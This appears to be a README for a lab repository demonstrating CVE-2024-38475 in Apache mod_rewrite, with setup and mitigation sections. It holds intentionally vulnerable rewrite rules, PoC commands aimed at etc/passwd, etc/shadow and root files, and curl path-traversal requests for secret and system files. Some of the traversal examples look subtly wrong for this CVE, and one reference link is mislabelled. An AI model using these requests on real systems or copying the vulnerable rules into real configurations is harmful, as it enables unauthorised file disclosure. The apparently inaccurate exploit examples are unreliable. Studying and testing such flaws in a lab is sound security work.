# CVE-2024-38475 - Apache mod_rewrite Vulnerability Demonstration

## Overview

This repository contains files to demonstrate **CVE-2024-38475**, a vulnerability in Apache HTTP Server 2.4.59 and earlier affecting the mod_rewrite module.

### Vulnerability Details

- **CVE ID**: CVE-2024-38475
- **Affected Versions**: Apache HTTP Server 2.4.0 through 2.4.59
- **Module**: mod_rewrite
- **Severity**: Important/High
- **Impact**: Code execution, source code disclosure
- **Fixed in**: Apache HTTP Server 2.4.60

## Description

Improper escaping of output in mod_rewrite allows an attacker to map URLs to filesystem locations that are permitted to be served by the server but are not intentionally/directly reachable by any URL, resulting in code execution or source code disclosure.

The vulnerability affects substitutions in server context that use backreferences or variables as the first segment of the substitution.

## Files Included

### 1. `vulnerable-httpd-2.4.59.conf`
A complete Apache configuration file demonstrating vulnerable rewrite rules that exhibit CVE-2024-38475.

**Key Vulnerable Patterns:**
```apache
# Using backreference as first segment
RewriteRule ^/files/(.*)$ /$1 [L]

# Using variables as first segment  
RewriteRule ^/browser/(.*)$ /%{HTTP_USER_AGENT}/$1 [L]

# Query parameter injection
RewriteCond %{QUERY_STRING} path=([^&]+)
RewriteRule ^/redirect$ /%1 [L,R=302]
```

### 2. `cve-2024-38475-demo.sh`
Comprehensive demonstration script that:
- Explains the vulnerability
- Sets up test environment
- Provides exploitation examples
- Shows mitigation strategies

### 3. `test-cve-2024-38475.sh`
Automated test script that validates the vulnerability by sending HTTP requests to potentially vulnerable endpoints.

### 4. `cve-2024-38475-poc.py`
Advanced Python Proof of Concept script that provides:
- Automated vulnerability detection
- Comprehensive payload testing
- Detailed reporting capabilities
- Custom target file testing
- Colored output and verbose logging

### 5. `poc-examples.py`
Interactive script demonstrating various usage examples of the Python PoC.

### 6. `run-complete-tests.py`
Complete test suite that runs all available testing methods and generates comprehensive reports.

### 7. `requirements.txt`
Python dependencies required for the PoC scripts.

### 8. `setup-httpd-2.4.59.sh`
Installation script for Apache HTTPD 2.4.59 (the vulnerable version).

## Setup Instructions

### Step 1: Install Apache HTTPD 2.4.59

```bash
# Make the setup script executable
chmod +x setup-httpd-2.4.59.sh

# Run the installation (requires sudo)
sudo ./setup-httpd-2.4.59.sh
```

### Step 2: Deploy Vulnerable Configuration

```bash
# Copy the vulnerable configuration
sudo cp vulnerable-httpd-2.4.59.conf /usr/local/apache2/conf/httpd.conf

# Create test directories and files
sudo mkdir -p /usr/local/apache2/secret
sudo mkdir -p /usr/local/apache2/admin
sudo mkdir -p /usr/local/apache2/htdocs/scripts

# Create test content
echo "SECRET DATA: Database password = secret123" | sudo tee /usr/local/apache2/secret/confidential.txt
echo "<?php echo 'Admin config loaded'; ?>" | sudo tee /usr/local/apache2/admin/config.php
```

### Step 3: Start Apache

```bash
# Start Apache with vulnerable configuration
sudo /usr/local/apache2/bin/apachectl start
```

### Step 4: Test the Vulnerability

#### Option A: Python PoC (Recommended)

```bash
# Install Python dependencies
pip3 install -r requirements.txt

# Basic vulnerability test
python3 cve-2024-38475-poc.py -u http://localhost

# Verbose output with detailed information
python3 cve-2024-38475-poc.py -u http://localhost -v

# Test specific custom files
python3 cve-2024-38475-poc.py -u http://localhost -f etc/passwd,etc/shadow,root/.bashrc

# Generate detailed report
python3 cve-2024-38475-poc.py -u http://localhost -o vulnerability_report.txt

# Run interactive examples
python3 poc-examples.py

# Run complete test suite
python3 run-complete-tests.py
```

#### Option B: Bash Script

```bash
# Make test script executable
chmod +x test-cve-2024-38475.sh

# Run automated tests
./test-cve-2024-38475.sh
```

## Manual Testing

Once Apache is running with the vulnerable configuration, you can manually test with curl:

### Path Traversal Attacks

```bash
# Access secret directory via path traversal
curl http://localhost/files/../../secret/confidential.txt

# Access admin files
curl http://localhost/files/../admin/config.php

# URL-encoded traversal
curl http://localhost/docs/..%2F..%2Fsecret/confidential.txt
```

### Query Parameter Injection

```bash
# Path injection via query parameter
curl http://localhost/redirect?path=../secret/confidential.txt

# System file access
curl http://localhost/redirect?path=../../etc/passwd
```

### Expected Results

If vulnerable, you should see:
- HTTP 200 responses for protected files
- Content of files that should be inaccessible
- Successful directory traversal outside web root

## Mitigation

### 1. Upgrade Apache
```bash
# Upgrade to Apache 2.4.60 or later
# Follow official Apache upgrade documentation
```

### 2. Fix Rewrite Rules
- Avoid using backreferences or variables as the first path segment
- Use absolute paths in rewrite targets
- Implement proper input validation

### 3. Use Security Flags
```apache
# In Apache 2.4.60+, use UnsafePrefixStat flag only when necessary
# and after ensuring the substitution is appropriately constrained
RewriteRule ^/files/(.*)$ /safe-path/$1 [L,UnsafePrefixStat]
```

### 4. Additional Security Measures
- Implement strict directory access controls
- Use Web Application Firewall (WAF)
- Regular security audits
- Monitor logs for path traversal attempts

## Security Notice

⚠️ **WARNING**: These files contain intentionally vulnerable configurations and should **NEVER** be used in production environments. They are provided for educational and testing purposes only.

## References

- [CVE-2024-38475 - MITRE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-38475)
- [Apache HTTP Server Security](https://httpd.apache.org/security/vulnerabilities_24.html)
- [Apache HTTP Server 2.4.60 Release Notes](https://httpd.apache.org/docs/2.4/new_features_2_4.html)

## Legal Disclaimer

This demonstration is provided for educational and authorized security testing purposes only. Do not use these techniques against systems you do not own or do not have explicit permission to test. The authors are not responsible for any misuse of this information.